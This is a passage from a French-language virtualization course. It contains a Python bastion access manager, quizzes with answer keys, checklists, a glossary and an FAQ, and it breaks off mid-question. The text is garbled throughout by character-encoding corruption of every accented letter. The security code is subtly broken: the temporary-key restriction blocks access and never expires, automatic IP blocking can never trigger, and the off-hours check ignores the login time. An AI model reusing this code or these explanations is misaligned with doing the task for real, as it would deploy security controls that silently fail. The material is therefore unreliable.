    def deploy_temp_key(self, user_id, public_key_path, duration_hours):
        """DÃ©ploiement clÃ© temporaire sur bastion"""
        with open(public_key_path, 'r') as f:
            public_key = f.read().strip()
            
        # Ajout clÃ© avec restriction temporelle
        authorized_keys_entry = f'command="echo \'Access expires in {duration_hours} hours\'",no-port-forwarding,no-X11-forwarding {public_key}'
        
        # DÃ©ploiement via Ansible
        ansible_playbook = f"""
- hosts: bastion_hosts
  tasks:
    - name: Add temporary SSH key
      authorized_key:
        user: {user_id}
        key: "{public_key}"
        key_options: 'command="echo Access expires in {duration_hours} hours",no-port-forwarding,no-X11-forwarding'
        state: present
"""
        
        with open(f"/tmp/deploy_key_{user_id}.yml", 'w') as f:
            f.write(ansible_playbook)
            
        subprocess.run([
            "ansible-playbook", f"/tmp/deploy_key_{user_id}.yml"
        ])
        
    def monitor_bastion_activity(self):
        """Surveillance continue de l'activitÃ© bastion"""
        while True:
            # Analyse logs en temps rÃ©el
            recent_logins = self.parse_auth_logs()
            
            for login in recent_logins:
                if self.detect_suspicious_activity(login):
                    self.handle_security_alert(login)
                    
            # VÃ©rification sessions expirÃ©es
            self.cleanup_expired_sessions()
            
            time.sleep(30)
            
    def detect_suspicious_activity(self, login_event):
        """DÃ©tection d'activitÃ© suspecte"""
        suspicious_indicators = []
        
        # Connexions depuis IP non autorisÃ©es
        if login_event['source_ip'] not in self.config['allowed_source_ips']:
            suspicious_indicators.append("unauthorized_source_ip")
            
        # Tentatives de connexion en dehors des heures autorisÃ©es
        current_hour = datetime.now().hour
        if not (8 <= current_hour <= 18):
            suspicious_indicators.append("off_hours_access")
            
        # Trop de tentatives de connexion
        if login_event['failed_attempts'] > 5:
            suspicious_indicators.append("brute_force_attempt")
            
        return len(suspicious_indicators) > 0
        
    def handle_security_alert(self, login_event):
        """Gestion des alertes de sÃ©curitÃ©"""
        alert = {
            "timestamp": datetime.now().isoformat(),
            "event_type": "bastion_security_alert",
            "source_ip": login_event['source_ip'],
            "user": login_event['user'],
            "indicators": login_event.get('suspicious_indicators', []),
            "severity": "high"
        }
        
        # Envoi vers SIEM
        self.send_to_siem(alert)
        
        # Blocage automatique si nÃ©cessaire
        if "brute_force_attempt" in alert['indicators']:
            self.block_source_ip(login_event['source_ip'])
            
        # Notification Ã©quipe sÃ©curitÃ©
        self.send_security_notification(alert)

if __name__ == "__main__":
    manager = BastionAccessManager()
    manager.monitor_bastion_activity()
```

### Cas d'usage spÃ©cialisÃ©s

**Environnement cloud hybride :** DÃ©ployez des bastions dans chaque zone de disponibilitÃ© avec rÃ©plication automatique des configurations et des clÃ©s d'accÃ¨s. Configurez des tunnels VPN site-Ã -site pour l'accÃ¨s sÃ©curisÃ© entre clouds.

**ConformitÃ© rÃ©glementaire :** ImplÃ©mentez des bastions avec enregistrement complet des sessions (keylogging, screen recording) pour rÃ©pondre aux exigences SOX, PCI-DSS, ou HIPAA. Configurez la rÃ©tention et l'archivage automatique des logs d'audit.

**Environnement DevOps :** IntÃ©grez les bastions avec les pipelines CI/CD pour l'accÃ¨s automatisÃ© aux environnements de production. Configurez des accÃ¨s temporaires basÃ©s sur les tickets de dÃ©ploiement avec rÃ©vocation automatique.

---


## Quiz Module 5 : Haute DisponibilitÃ©

**Question 1 :** Quelle est la diffÃ©rence principale entre un cluster actif/passif et actif/actif ?
a) Le nombre de nÅ“uds dans le cluster
b) La rÃ©partition de la charge de travail
c) Le type de stockage utilisÃ©
d) La version de Proxmox

**Question 2 :** Dans un cluster Proxmox, quel est le nombre minimum de nÅ“uds recommandÃ© pour Ã©viter le split-brain ?
a) 2 nÅ“uds
b) 3 nÅ“uds
c) 4 nÅ“uds
d) 5 nÅ“uds

**Question 3 :** Quel protocole Ceph utilise-t-il pour la rÃ©plication des donnÃ©es ?
a) NFS
b) iSCSI
c) CRUSH
d) DRBD

**Question 4 :** Qu'est-ce que le quorum dans un cluster ?
a) Le nombre total de nÅ“uds
b) La majoritÃ© des nÅ“uds nÃ©cessaire pour les dÃ©cisions
c) Le nÅ“ud principal du cluster
d) Le stockage partagÃ©

**Question 5 :** Quelle commande permet de vÃ©rifier l'Ã©tat d'un cluster Proxmox ?
a) `pveversion`
b) `pvecm status`
c) `qm list`
d) `pct list`

**RÃ©ponses :** 1-b, 2-b, 3-c, 4-b, 5-b

---

## Bonnes Pratiques Module 5

### âœ… Check-list Haute DisponibilitÃ©

**Planification cluster :**
- [ ] Dimensionner avec un nombre impair de nÅ“uds (minimum 3)
- [ ] PrÃ©voir la redondance rÃ©seau (minimum 2 liens par nÅ“ud)
- [ ] Calculer les ressources avec marge de sÃ©curitÃ© (N+1 ou N+2)
- [ ] Documenter la topologie et les dÃ©pendances

**Configuration rÃ©seau :**
- [ ] Configurer des VLANs dÃ©diÃ©s pour le trafic cluster
- [ ] ImplÃ©menter le bonding rÃ©seau pour la redondance
- [ ] Tester la bande passante entre nÅ“uds
- [ ] Configurer la surveillance rÃ©seau

**Stockage distribuÃ© :**
- [ ] Configurer Ceph avec au moins 3 OSD par nÅ“ud
- [ ] DÃ©finir des rÃ¨gles CRUSH appropriÃ©es
- [ ] Monitorer l'espace disque et les performances
- [ ] Planifier la maintenance des disques

**Surveillance et maintenance :**
- [ ] Configurer les alertes de santÃ© cluster
- [ ] Planifier les mises Ã  jour coordonnÃ©es
- [ ] Tester rÃ©guliÃ¨rement les procÃ©dures de failover
- [ ] Documenter les procÃ©dures d'urgence

---

## Quiz Module 6 : DevOps

**Question 1 :** Quelle est la diffÃ©rence principale entre l'approche dÃ©clarative et impÃ©rative en IaC ?
a) Le langage de programmation utilisÃ©
b) La description de l'Ã©tat final vs les Ã©tapes pour y parvenir
c) La vitesse d'exÃ©cution
d) La compatibilitÃ© avec le cloud

**Question 2 :** Dans un pipeline GitLab CI/CD, Ã  quelle Ã©tape doit-on typiquement crÃ©er les VMs temporaires ?
a) build
b) test
c) prepare
d) deploy

**Question 3 :** Quel est l'avantage principal de Kubernetes sur infrastructure virtualisÃ©e ?
a) RÃ©duction des coÃ»ts
b) Isolation renforcÃ©e (VM + namespace)
c) SimplicitÃ© de configuration
d) CompatibilitÃ© Windows

**Question 4 :** Quelle commande Terraform permet d'appliquer les changements d'infrastructure ?
a) `terraform plan`
b) `terraform apply`
c) `terraform init`
d) `terraform validate`

**Question 5 :** Dans une architecture microservices, pourquoi utiliser des VMs dÃ©diÃ©es par service ?
a) Pour rÃ©duire les coÃ»ts
b) Pour l'isolation et la scalabilitÃ© indÃ©pendante
c) Pour simplifier le dÃ©ploiement
d) Pour amÃ©liorer les performances

**RÃ©ponses :** 1-b, 2-c, 3-b, 4-b, 5-b

---

## Bonnes Pratiques Module 6

### âœ… Check-list DevOps

**Infrastructure as Code :**
- [ ] Versionner tous les fichiers de configuration infrastructure
- [ ] Utiliser des modules rÃ©utilisables (Terraform, Ansible)
- [ ] ImplÃ©menter la validation automatique (terraform validate, ansible-lint)
- [ ] SÃ©parer les environnements (dev, staging, prod)

**Pipelines CI/CD :**
- [ ] Isoler chaque build dans des VMs dÃ©diÃ©es
- [ ] ImplÃ©menter des tests automatisÃ©s Ã  chaque Ã©tape
- [ ] Configurer le nettoyage automatique des ressources temporaires
- [ ] Monitorer les performances et la durÃ©e des pipelines

**Gestion des secrets :**
- [ ] Utiliser des solutions dÃ©diÃ©es (Vault, Ansible Vault)
- [ ] Chiffrer les donnÃ©es sensibles en transit et au repos
- [ ] ImplÃ©menter la rotation automatique des secrets
- [ ] Auditer l'accÃ¨s aux secrets

**Monitoring et observabilitÃ© :**
- [ ] DÃ©ployer une stack de monitoring complÃ¨te (Prometheus, Grafana)
- [ ] Configurer des alertes proactives
- [ ] ImplÃ©menter le tracing distribuÃ©
- [ ] Centraliser les logs avec ELK ou Ã©quivalent

---

## Quiz Module 7 : CybersÃ©curitÃ©

**Question 1 :** Dans un laboratoire Red Team, pourquoi utiliser des VMs isolÃ©es pour les attaquants ?
a) Pour rÃ©duire les coÃ»ts
b) Pour Ã©viter la contamination de l'infrastructure
c) Pour amÃ©liorer les performances
d) Pour simplifier la gestion

**Question 2 :** Quelle est la fonction principale d'une DMZ ?
a) AccÃ©lÃ©rer le rÃ©seau
b) CrÃ©er une zone tampon entre Internet et le rÃ©seau interne
c) RÃ©duire la latence
d) Augmenter la bande passante

**Question 3 :** Dans une architecture Zero Trust, que signifie "never trust, always verify" ?
a) Bloquer tout le trafic
b) VÃ©rifier chaque connexion indÃ©pendamment du contexte
c) Faire confiance aux utilisateurs internes
d) Utiliser uniquement des VPNs

**Question 4 :** Quel est l'avantage principal d'un bastion host ?
a) AmÃ©liorer les performances rÃ©seau
b) Centraliser et contrÃ´ler l'accÃ¨s aux systÃ¨mes internes
c) RÃ©duire les coÃ»ts de licence
d) Simplifier la configuration rÃ©seau

**Question 5 :** Dans la segmentation rÃ©seau, que reprÃ©sente un VLAN ?
a) Un protocole de routage
b) Un domaine de diffusion logique isolÃ©
c) Un type de firewall
d) Un algorithme de chiffrement

**RÃ©ponses :** 1-b, 2-b, 3-b, 4-b, 5-b

---

## Bonnes Pratiques Module 7

### âœ… Check-list CybersÃ©curitÃ©

**Laboratoires Red Team :**
- [ ] Isoler complÃ¨tement les environnements d'attaque
- [ ] ImplÃ©menter des snapshots pour la rÃ©initialisation rapide
- [ ] Configurer la surveillance et l'enregistrement de toutes les activitÃ©s
- [ ] Documenter les scÃ©narios d'attaque et les contre-mesures

**Segmentation rÃ©seau :**
- [ ] ImplÃ©menter une politique de moindre privilÃ¨ge par dÃ©faut
- [ ] Configurer des VLANs dÃ©diÃ©s par fonction mÃ©tier
- [ ] DÃ©ployer des firewalls entre chaque segment
- [ ] Monitorer le trafic inter-segments

**DMZ et bastions :**
- [ ] Configurer une DMZ multicouche (externe/interne)
- [ ] Durcir la configuration des bastions (SSH, audit, monitoring)
- [ ] ImplÃ©menter l'authentification multi-facteurs
- [ ] Configurer la rÃ©vocation automatique des accÃ¨s temporaires

**Surveillance et dÃ©tection :**
- [ ] DÃ©ployer des IDS/IPS sur tous les segments critiques
- [ ] Centraliser les logs de sÃ©curitÃ© dans un SIEM
- [ ] Configurer des alertes en temps rÃ©el
- [ ] Effectuer des tests de pÃ©nÃ©tration rÃ©guliers

---

## RÃ©fÃ©rences Module 5-7

### Documentation officielle
- [Proxmox Cluster Manager](https://pve.proxmox.com/wiki/Cluster_Manager)
- [Ceph Documentation](https://docs.ceph.com/)
- [Terraform Proxmox Provider](https://registry.terraform.io/providers/Telmate/proxmox/)
- [Kubernetes Documentation](https://kubernetes.io/docs/)
- [pfSense Documentation](https://docs.netgate.com/pfsense/)

### RFC et standards
- RFC 3768 : Virtual Router Redundancy Protocol (VRRP)
- RFC 4271 : Border Gateway Protocol 4 (BGP-4)
- RFC 7348 : Virtual eXtensible Local Area Network (VXLAN)
- NIST SP 800-53 : Security Controls for Federal Information Systems

### Blogs et ressources
- [Proxmox Community](https://forum.proxmox.com/)
- [Red Hat OpenShift Blog](https://www.redhat.com/en/blog)
- [SANS Institute](https://www.sans.org/)
- [OWASP Foundation](https://owasp.org/)

---


# Glossaire Technique

## A

**API (Application Programming Interface)** : Interface de programmation permettant l'interaction entre diffÃ©rents logiciels. Dans le contexte de la virtualisation, les APIs permettent l'automatisation et la gestion programmatique des ressources virtuelles.

**Ansible** : Outil d'automatisation open-source utilisant des playbooks YAML pour configurer et gÃ©rer l'infrastructure. ParticuliÃ¨rement efficace pour la configuration post-dÃ©ploiement des machines virtuelles.

**Affinity/Anti-affinity** : RÃ¨gles dÃ©finissant si des VMs doivent Ãªtre placÃ©es sur le mÃªme hÃ´te physique (affinity) ou sÃ©parÃ©es (anti-affinity) pour optimiser les performances ou la disponibilitÃ©.

## B

**Ballooning** : Technique de gestion dynamique de la mÃ©moire permettant Ã  l'hyperviseur de rÃ©cupÃ©rer la RAM inutilisÃ©e des VMs pour la redistribuer selon les besoins.

**Bridge (Pont rÃ©seau)** : Dispositif rÃ©seau virtuel connectant plusieurs segments rÃ©seau au niveau de la couche 2 (liaison de donnÃ©es). Dans Proxmox, vmbr0 est le bridge par dÃ©faut.

**Bonding** : AgrÃ©gation de plusieurs interfaces rÃ©seau physiques en une seule interface logique pour augmenter la bande passante et assurer la redondance.

**Bastion Host** : Serveur sÃ©curisÃ© servant de point d'accÃ¨s unique et contrÃ´lÃ© vers un rÃ©seau interne depuis l'extÃ©rieur. Ã‰galement appelÃ© jump server.

## C

**Ceph** : SystÃ¨me de stockage distribuÃ© open-source offrant stockage objet, bloc et fichier avec rÃ©plication automatique et haute disponibilitÃ©.

**Container (Conteneur)** : Technologie de virtualisation lÃ©gÃ¨re partageant le noyau de l'OS hÃ´te tout en isolant les applications. LXC est l'implÃ©mentation utilisÃ©e par Proxmox.

**CPU Pinning** : Attribution dÃ©diÃ©e de cÅ“urs CPU physiques spÃ©cifiques Ã  une VM pour optimiser les performances et rÃ©duire la latence.

**CRUSH (Controlled Replication Under Scalable Hashing)** : Algorithme utilisÃ© par Ceph pour dÃ©terminer la placement et la rÃ©plication des donnÃ©es dans le cluster de stockage.

**Cloud-init** : Standard d'initialisation automatique des instances cloud permettant la configuration initiale des VMs (rÃ©seau, utilisateurs, packages).

## D

**DMZ (Demilitarized Zone)** : Zone rÃ©seau intermÃ©diaire entre Internet et le rÃ©seau interne, hÃ©bergeant les services publics tout en protÃ©geant l'infrastructure interne.

**DRBD (Distributed Replicated Block Device)** : Solution de rÃ©plication de donnÃ©es en temps rÃ©el au niveau bloc entre serveurs pour assurer la haute disponibilitÃ©.

**Docker** : Plateforme de conteneurisation permettant d'empaqueter des applications avec leurs dÃ©pendances dans des conteneurs portables.

## E

**Ephemeral Storage** : Stockage temporaire attachÃ© Ã  une VM qui est perdu lors de l'arrÃªt de l'instance. UtilisÃ© pour les donnÃ©es temporaires et les caches.

**ESXI** : Hyperviseur bare-metal de VMware offrant des fonctionnalitÃ©s de virtualisation d'entreprise avec gestion centralisÃ©e via vCenter.

**etcd** : Base de donnÃ©es clÃ©-valeur distribuÃ©e utilisÃ©e par Kubernetes pour stocker la configuration du cluster et l'Ã©tat des objets.

## F

**Failover** : Processus automatique de basculement vers un systÃ¨me de secours en cas de dÃ©faillance du systÃ¨me principal.

**Fencing** : MÃ©canisme de protection dans un cluster qui isole ou redÃ©marre un nÅ“ud dÃ©faillant pour Ã©viter la corruption des donnÃ©es.

**Flannel** : Plugin rÃ©seau (CNI) pour Kubernetes crÃ©ant un rÃ©seau overlay permettant la communication entre pods sur diffÃ©rents nÅ“uds.

## G

**GPU Passthrough** : Technique permettant Ã  une VM d'accÃ©der directement Ã  une carte graphique physique pour les applications nÃ©cessitant l'accÃ©lÃ©ration GPU.

**GitOps** : MÃ©thodologie DevOps utilisant Git comme source de vÃ©ritÃ© pour la configuration d'infrastructure et les dÃ©ploiements automatisÃ©s.

**Grafana** : Plateforme de visualisation et d'analyse de mÃ©triques permettant de crÃ©er des tableaux de bord pour le monitoring d'infrastructure.

## H

**HA (High Availability)** : Architecture garantissant un niveau Ã©levÃ© de disponibilitÃ© opÃ©rationnelle, gÃ©nÃ©ralement exprimÃ© en pourcentage (99.9%, 99.99%).

**Hugepages** : Pages mÃ©moire de grande taille (2MB ou 1GB) rÃ©duisant la surcharge de gestion de la mÃ©moire virtuelle pour les applications nÃ©cessitant de hautes performances.

**Hyperviseur** : Logiciel crÃ©ant et gÃ©rant les machines virtuelles. Type 1 (bare-metal) comme Proxmox, ou Type 2 (hosted) comme VirtualBox.

**HAProxy** : Load balancer et proxy inverse open-source offrant haute disponibilitÃ©, rÃ©partition de charge et terminaison SSL.

## I

**IaC (Infrastructure as Code)** : Pratique de gestion d'infrastructure via du code versionnÃ© et automatisÃ© plutÃ´t que par des processus manuels.

**IOMMU (Input-Output Memory Management Unit)** : Composant matÃ©riel permettant la virtualisation des pÃ©riphÃ©riques et le passthrough sÃ©curisÃ© vers les VMs.

**iSCSI** : Protocole permettant l'accÃ¨s Ã  des pÃ©riphÃ©riques de stockage distants via le rÃ©seau IP, crÃ©ant des SAN (Storage Area Networks).

**Ingress** : Objet Kubernetes gÃ©rant l'accÃ¨s externe aux services du cluster, typiquement HTTP/HTTPS avec routage basÃ© sur les noms d'hÃ´tes.

## J

**Jump Server** : Voir Bastion Host. Serveur intermÃ©diaire sÃ©curisÃ© pour accÃ©der aux systÃ¨mes internes depuis l'extÃ©rieur.

**Jenkins** : Serveur d'automatisation open-source pour l'intÃ©gration et le dÃ©ploiement continus (CI/CD).

## K

**KVM (Kernel-based Virtual Machine)** : Hyperviseur intÃ©grÃ© au noyau Linux transformant Linux en hyperviseur bare-metal. Base technologique de Proxmox.

**Kubernetes** : Plateforme d'orchestration de conteneurs automatisant le dÃ©ploiement, la mise Ã  l'Ã©chelle et la gestion des applications conteneurisÃ©es.

**kubectl** : Interface en ligne de commande pour interagir avec les clusters Kubernetes.

## L

**LXC (Linux Containers)** : Technologie de virtualisation au niveau OS permettant d'exÃ©cuter plusieurs systÃ¨mes Linux isolÃ©s sur un seul hÃ´te.

**LVM (Logical Volume Manager)** : Gestionnaire de volumes logiques permettant la gestion flexible des espaces de stockage avec redimensionnement dynamique.

**Load Balancer** : Dispositif distribuant le trafic rÃ©seau entre plusieurs serveurs pour optimiser les performances et assurer la disponibilitÃ©.

**Lateral Movement** : Technique d'attaque consistant Ã  se dÃ©placer horizontalement dans un rÃ©seau aprÃ¨s la compromission initiale pour accÃ©der Ã  d'autres systÃ¨mes.

## M

**Microservices** : Architecture applicative dÃ©composant une application en services indÃ©pendants communiquant via des APIs.

**Migration Live** : DÃ©placement d'une VM en cours d'exÃ©cution d'un hÃ´te physique vers un autre sans interruption de service.

**Monitoring** : Surveillance continue des systÃ¨mes et applications pour dÃ©tecter les problÃ¨mes et optimiser les performances.

**Multi-tenant** : Architecture permettant Ã  plusieurs clients (tenants) de partager une infrastructure tout en maintenant l'isolation des donnÃ©es.

## N

**NFS (Network File System)** : Protocole permettant l'accÃ¨s Ã  des fichiers distants via le rÃ©seau comme s'ils Ã©taient locaux.

**NUMA (Non-Uniform Memory Access)** : Architecture oÃ¹ l'accÃ¨s mÃ©moire varie selon la localisation physique, importante pour l'optimisation des performances VM.

**Namespace** : MÃ©canisme d'isolation des ressources dans Linux et Kubernetes permettant la sÃ©paration logique des processus et objets.

**Network Policy** : RÃ¨gles Kubernetes dÃ©finissant comment les pods peuvent communiquer entre eux et avec d'autres endpoints rÃ©seau.

## O

**Orchestration** : Automatisation coordonnÃ©e de multiples tÃ¢ches et services pour gÃ©rer des workflows complexes.

**OVS (Open vSwitch)** : Switch virtuel open-source supportant les standards rÃ©seau et les protocoles SDN comme OpenFlow.

**Overcommit** : Allocation de ressources virtuelles (CPU, RAM) supÃ©rieure aux ressources physiques disponibles, basÃ©e sur l'utilisation statistique.

**OSD (Object Storage Daemon)** : DÃ©mon Ceph gÃ©rant le stockage des donnÃ©es sur les disques physiques dans un cluster de stockage distribuÃ©.

## P

**Proxmox VE** : Plateforme de virtualisation open-source basÃ©e sur KVM et LXC avec interface web de gestion intÃ©grÃ©e.

**Pod** : Plus petite unitÃ© dÃ©ployable dans Kubernetes, contenant un ou plusieurs conteneurs partageant le rÃ©seau et le stockage.

**Persistent Volume** : Stockage persistant dans Kubernetes indÃ©pendant du cycle de vie des pods.

**pfSense** : Distribution firewall/routeur open-source basÃ©e sur FreeBSD, utilisÃ©e pour la sÃ©curitÃ© rÃ©seau et la segmentation.

## Q

**QEMU** : Ã‰mulateur et virtualiseur open-source utilisÃ© par KVM pour la virtualisation matÃ©rielle.

**Quorum** : Nombre minimum de nÅ“uds nÃ©cessaires dans un cluster pour prendre des dÃ©cisions et Ã©viter le split-brain.

**QoS (Quality of Service)** : MÃ©canismes de priorisation et de limitation du trafic rÃ©seau pour garantir les performances des applications critiques.

## R

**Red Team** : Ã‰quipe simulant des attaques pour tester la sÃ©curitÃ© d'une organisation et identifier les vulnÃ©rabilitÃ©s.

**Replica Set** : Objet Kubernetes maintenant un nombre spÃ©cifiÃ© de rÃ©pliques de pods en cours d'exÃ©cution.

**RAID (Redundant Array of Independent Disks)** : Technologie combinant plusieurs disques pour amÃ©liorer les performances et/ou la redondance.

**RBD (RADOS Block Device)** : Interface de stockage bloc de Ceph permettant l'accÃ¨s aux donnÃ©es via des volumes virtuels.

## S

**SDN (Software-Defined Networking)** : Approche rÃ©seau sÃ©parant le plan de contrÃ´le du plan de donnÃ©es pour une gestion centralisÃ©e et programmable.

**SIEM (Security Information and Event Management)** : SystÃ¨me centralisant et analysant les logs de sÃ©curitÃ© pour dÃ©tecter les menaces.

**Split-brain** : Situation dans un cluster oÃ¹ les nÅ“uds ne peuvent plus communiquer, risquant des dÃ©cisions contradictoires.

**Snapshot** : Capture instantanÃ©e de l'Ã©tat d'une VM ou d'un volume de stockage permettant la restauration ultÃ©rieure.

**SR-IOV** : Technologie permettant Ã  un pÃ©riphÃ©rique PCIe de prÃ©senter plusieurs fonctions virtuelles aux VMs pour de meilleures performances.

## T

**Terraform** : Outil IaC permettant de dÃ©finir et provisionner l'infrastructure via des fichiers de configuration dÃ©claratifs.

**Thin Provisioning** : Allocation dynamique de l'espace de stockage, allouant l'espace physique uniquement lors de l'Ã©criture effective des donnÃ©es.

**Template** : Image prÃ©configurÃ©e d'une VM servant de base pour crÃ©er rapidement de nouvelles instances identiques.

**Taints et Tolerations** : MÃ©canisme Kubernetes permettant de contrÃ´ler sur quels nÅ“uds les pods peuvent Ãªtre planifiÃ©s.

## U

**Uptime** : Temps pendant lequel un systÃ¨me est opÃ©rationnel et disponible, gÃ©nÃ©ralement exprimÃ© en pourcentage.

**UUID (Universally Unique Identifier)** : Identifiant unique de 128 bits utilisÃ© pour identifier les ressources virtuelles de maniÃ¨re non ambiguÃ«.

## V

**VLAN (Virtual Local Area Network)** : Segmentation logique d'un rÃ©seau physique crÃ©ant des domaines de diffusion isolÃ©s.

**vCPU (Virtual CPU)** : Processeur virtuel allouÃ© Ã  une VM, pouvant correspondre Ã  un cÅ“ur physique ou une fraction selon la configuration.

**VirtIO** : Framework de virtualisation paravirtualisÃ©e offrant de meilleures performances pour les pÃ©riphÃ©riques virtuels.

**vNIC (Virtual Network Interface Card)** : Carte rÃ©seau virtuelle permettant Ã  une VM de se connecter aux rÃ©seaux virtuels.

**VPN (Virtual Private Network)** : RÃ©seau privÃ© virtuel crÃ©ant une connexion sÃ©curisÃ©e et chiffrÃ©e sur un rÃ©seau public.

## W

**WAF (Web Application Firewall)** : Firewall applicatif protÃ©geant les applications web contre les attaques spÃ©cifiques (OWASP Top 10).

**Webhook** : MÃ©canisme permettant Ã  une application d'envoyer des donnÃ©es en temps rÃ©el vers d'autres applications lors d'Ã©vÃ©nements spÃ©cifiques.

## X

**XFS** : SystÃ¨me de fichiers haute performance optimisÃ© pour les gros volumes et les opÃ©rations parallÃ¨les, souvent utilisÃ© avec Ceph.

## Y

**YAML (YAML Ain't Markup Language)** : Format de sÃ©rialisation de donnÃ©es lisible utilisÃ© pour les fichiers de configuration (Ansible, Kubernetes).

## Z

**ZFS (Zettabyte File System)** : SystÃ¨me de fichiers avancÃ© combinant gestionnaire de volumes et systÃ¨me de fichiers avec fonctionnalitÃ©s de protection des donnÃ©es intÃ©grÃ©es.

**Zero Trust** : ModÃ¨le de sÃ©curitÃ© basÃ© sur le principe "never trust, always verify", vÃ©rifiant chaque connexion indÃ©pendamment de sa localisation.

**Zone** : Segment rÃ©seau ou gÃ©ographique isolÃ© dans une architecture distribuÃ©e, utilisÃ© pour la rÃ©partition des charges et la rÃ©silience.

---

# FAQ - Questions FrÃ©quentes

## Questions GÃ©nÃ©rales

**Q: Quelle est la diffÃ©rence entre virtualisation et conteneurisation ?**
R: La virtualisation (VMs) Ã©mule un matÃ©riel complet avec un OS invitÃ©, offrant une isolation forte mais avec plus de surcharge. La conteneurisation partage le noyau de l'OS hÃ´te, Ã©tant plus lÃ©gÃ¨re mais avec une isolation moindre. Les VMs sont idÃ©ales pour des OS diffÃ©rents ou l'isolation de sÃ©curitÃ©, les conteneurs pour la portabilitÃ© applicative et la densitÃ©.

**Q: Combien de VMs puis-je faire tourner sur mon serveur ?**
R: Cela dÃ©pend des ressources (CPU, RAM, stockage) et des besoins des VMs. RÃ¨gle gÃ©nÃ©rale : comptez 1-2 GB RAM par VM lÃ©gÃ¨re, 4-8 GB pour des serveurs d'applications. Pour le CPU, un ratio 4:1 (4 vCPU pour 1 cÅ“ur physique) est souvent acceptable pour des charges mixtes. Surveillez les mÃ©triques de performance pour ajuster.

**Q: Dois-je choisir KVM, VMware ou Hyper-V ?**
R: KVM (Proxmox) : open-source, gratuit, excellent pour l'apprentissage et les PME. VMware : leader du marchÃ©, fonctionnalitÃ©s avancÃ©es, support commercial, coÃ»teux. Hyper-V : intÃ©grÃ© Windows, bon pour les environnements Microsoft. Pour dÃ©buter, Proxmox offre le meilleur rapport fonctionnalitÃ©s/coÃ»t.

**Q: Comment sauvegarder efficacement mes VMs ?**
R: Utilisez les snapshots pour les sauvegardes rapides avant maintenance, mais ne les gardez pas longtemps (impact performance). Pour les sauvegardes rÃ©guliÃ¨res, utilisez Proxmox Backup Server ou des solutions comme Veeam. Planifiez des sauvegardes complÃ¨tes hebdomadaires et incrÃ©mentales quotidiennes. Testez rÃ©guliÃ¨rement la restauration.

## Questions RÃ©seau

**Q: Quelle est la diffÃ©rence entre un bridge et un switch virtuel ?**
R: Un bridge (pont) connecte des segments rÃ©seau au niveau 2, transmettant les trames selon les adresses MAC. Un switch virtuel est plus avancÃ©, offrant des fonctionnalitÃ©s comme les VLANs, QoS, et monitoring. Dans Proxmox, vmbr0 est un bridge Linux, tandis qu'Open vSwitch est un switch virtuel complet.

**Q: Comment configurer plusieurs VLANs sur une seule interface physique ?**
R: Utilisez le VLAN tagging (802.1Q). Configurez l'interface physique en mode trunk, puis crÃ©ez des sous-interfaces pour chaque VLAN (eth0.10, eth0.20). Dans Proxmox, ajoutez le tag VLAN dans la configuration rÃ©seau de chaque VM. Le switch physique doit Ã©galement supporter le trunking.

**Q: Mes VMs n'arrivent pas Ã  communiquer entre elles, que faire ?**
R: VÃ©rifiez : 1) Les VMs sont sur le mÃªme bridge/VLAN, 2) Les firewalls (iptables, Windows Firewall) ne bloquent pas, 3) La configuration IP (mÃªme sous-rÃ©seau, passerelle correcte), 4) Les rÃ¨gles de sÃ©curitÃ© Proxmox, 5) La configuration du switch physique si applicable.

**Q: Comment optimiser les performances rÃ©seau des VMs ?**
R: Utilisez VirtIO pour les interfaces rÃ©seau (meilleures performances), activez le multiqueue, configurez le bonding sur l'hÃ´te pour la redondance et la bande passante, utilisez des rÃ©seaux 10 Gigabit pour les charges importantes, et optimisez les buffers rÃ©seau selon votre charge de travail.

## Questions Stockage

**Q: LVM-Thin vs ZFS vs Ceph, lequel choisir ?**
R: LVM-Thin : simple, performant, bon pour dÃ©buter. ZFS : fonctionnalitÃ©s avancÃ©es (snapshots, compression, dÃ©duplication), excellent pour serveurs uniques. Ceph : stockage distribuÃ©, haute disponibilitÃ©, complexe Ã  gÃ©rer. Choisissez selon vos besoins de disponibilitÃ© et votre expertise.

**Q: Comment gÃ©rer l'espace disque qui se remplit rapidement ?**
R: Activez thin provisioning, nettoyez rÃ©guliÃ¨rement les snapshots anciens, utilisez la compression (ZFS), configurez des alertes de surveillance, planifiez la croissance avec des disques supplÃ©mentaires. Ã‰vitez l'overprovisioning excessif sans surveillance.

**Q: Puis-je migrer mes VMs entre diffÃ©rents types de stockage ?**
R: Oui, Proxmox permet la migration de stockage Ã  chaud. Utilisez la fonction "Move disk" dans l'interface web ou la commande `qm move_disk`. La migration peut prendre du temps selon la taille du disque et la vitesse du rÃ©seau/stockage.

**Q: Comment optimiser les performances de stockage ?**
R: Utilisez des SSD pour les VMs critiques, configurez le cache appropriÃ© (writethrough pour la sÃ©curitÃ©, writeback pour les performances), activez discard/TRIM, utilisez des contrÃ´leurs VirtIO SCSI, et sÃ©parez les charges (OS sur SSD, donnÃ©es sur HDD).

## Questions SÃ©curitÃ©

**Q: Comment sÃ©curiser mon infrastructure Proxmox ?**
R: Changez les mots de passe par dÃ©faut, activez l'authentification Ã  deux facteurs, configurez un firewall, mettez Ã  jour rÃ©guliÃ¨rement, utilisez des certificats SSL valides, limitez l'accÃ¨s SSH, configurez la surveillance des logs, et sÃ©parez les rÃ©seaux de gestion.

**Q: Comment isoler complÃ¨tement des VMs pour la sÃ©curitÃ© ?**
R: Utilisez des VLANs sÃ©parÃ©s, configurez des rÃ¨gles de firewall strictes, dÃ©sactivez les services non nÃ©cessaires, utilisez des templates durcis, configurez la surveillance de sÃ©curitÃ©, et considÃ©rez l'utilisation de solutions comme AppArmor ou SELinux dans les VMs.

**Q: Comment dÃ©tecter une intrusion dans mon infrastructure virtualisÃ©e ?**
R: DÃ©ployez un SIEM centralisÃ©, configurez la surveillance des logs systÃ¨me et rÃ©seau, utilisez des IDS/IPS, surveillez les performances anormales, configurez des alertes sur les connexions suspectes, et effectuez des audits de sÃ©curitÃ© rÃ©guliers.

## Questions Performance

**Q: Mes VMs sont lentes, comment diagnostiquer ?**
R: VÃ©rifiez les mÃ©triques : CPU (wait time, steal time), RAM (swap usage), disque (IOPS, latence), rÃ©seau (bande passante, erreurs). Utilisez `htop`, `iotop`, `iftop` dans l'hÃ´te et les VMs. VÃ©rifiez l'overcommit des ressources et les conflits de charge.

**Q: Comment optimiser les performances CPU des VMs ?**
R: Utilisez CPU pinning pour les charges critiques, configurez la topologie NUMA correctement, Ã©vitez l'overcommit excessif, utilisez le type CPU "host" pour de meilleures performances, et ajustez les prioritÃ©s selon l'importance des VMs.

**Q: Pourquoi mes VMs consomment-elles plus de RAM que prÃ©vu ?**
